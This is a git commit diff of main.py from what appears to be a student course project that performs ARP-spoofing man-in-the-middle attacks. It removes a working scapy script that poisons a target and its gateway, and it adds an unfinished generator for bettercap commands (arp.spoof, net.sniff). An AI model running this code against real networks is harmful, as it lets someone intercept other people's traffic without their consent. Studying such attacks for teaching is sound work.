6be13cbb8908d2bd90d5dae1c1d328517b8b8fc4
nfisherman <ca.lehman05@gmail.com>
2024-12-10 01:20:59 -0600

    most things

--- main.py
+++ main.py
@@ -1,30 +1,40 @@
-from scapy.all import ARP, send
-import os
-import sys
-import time
+import argparse
+import subprocess
+from random import choice
+from string import ascii_letters
+import socket
 
-def spoof(target_ip, spoof_ip):
-    # Construct the ARP packet
-    arp_response = ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=spoof_ip)
-    send(arp_response, verbose=False)
+def gen_cap(file_name, target_ip):
+    with open(file_name, "w+") as file:
+        lines = [
+            "net.probe on\n",
+            "set arp.spoof.fullduplex true\n", 
+            f"set arp.spoof.targets {target_ip}\n",
+            "arp.spoof on\n",
+            "set net.sniff.local true\n",
+            "net.sniff on"
+        ]
 
-def restore(target_ip, source_ip):
-    # Restore the network to its normal state
-    arp_response = ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=source_ip, hwsrc="ff:ff:ff:ff:ff:ff")
-    send(arp_response, count=4, verbose=False)
+        file.writelines(lines)
 
 if __name__ == "__main__":
-    target_ip = input("Enter Target IP: ")
-    gateway_ip = input("Enter Gateway IP: ")
-    
+    parser = argparse.ArgumentParser(
+        prog="mac-spoof",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        description="A program which performs a MITM attack by spoofing the MAC address. (INFOST 695-001 Final Project)",
+        epilog="Copyright © 2024 Hemanth Chinnappa, Kevin Agyei, Lauren Rodriguez, & Cedar Lehman.\nSee LICENSE file for more details."
+    )
+    parser.add_argument("target", help="IP of the computer you want to target")
+    args = parser.parse_args()
+
+    # test to see if IP is valid
     try:
-        while True:
-            spoof(target_ip, gateway_ip)
-            spoof(gateway_ip, target_ip)
-            time.sleep(2)
-    except KeyboardInterrupt:
-        print("\nRestoring network...")
-        restore(target_ip, gateway_ip)
-        restore(gateway_ip, target_ip)
-        sys.exit(0)
+        socket.inet_aton(args.target)
+    except socket.error:
+        parser.error(f"target '{args.target}' is not a valid IP address")
+
+    temp_file = '/tmp/mac-address-spoofer-' + ''.join(choice(ascii_letters) for i in range(10)) + '.cap'
+    print(temp_file)
+
+    # gen_cap(temp_file, )
         
